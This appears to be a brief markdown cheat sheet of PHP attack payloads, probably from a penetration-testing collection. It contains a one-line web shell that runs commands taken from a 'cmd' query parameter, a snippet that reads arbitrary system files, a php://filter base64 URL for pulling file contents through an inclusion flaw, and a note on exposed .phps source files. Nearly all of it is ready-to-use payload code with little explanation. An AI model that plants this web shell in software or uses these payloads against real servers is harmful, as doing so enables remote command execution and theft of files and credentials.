# PHP

## Summary
* [Read system's files](#read-system's-files)
* [Pass a command via query parameter](#pass-a-command-via-query-parameter)
* [Bypass script protection to read a file](#bypass-script-protection-to-read-a-file)
* [Making use of PHP syntax highlighting enabled](#making-use-of-php-syntax-highlighting-enabled)

## Read system's files
```
<?php echo file_get_contents('/path/to/target/file'); ?>
```
## Pass a command via query parameter
```
<?php echo system($_GET['cmd']); ?>
```
## Bypass script protection to read a file
```
http://localhost/read?query=php://filter/convert.base64-encode/resource=/[path]
```
## Making use of PHP syntax highlighting enabled
#### PHP syntax highlighting gives the ability to render PHP code on any browser usially stored in a .phps file
```
http://example.com/config.phps
```
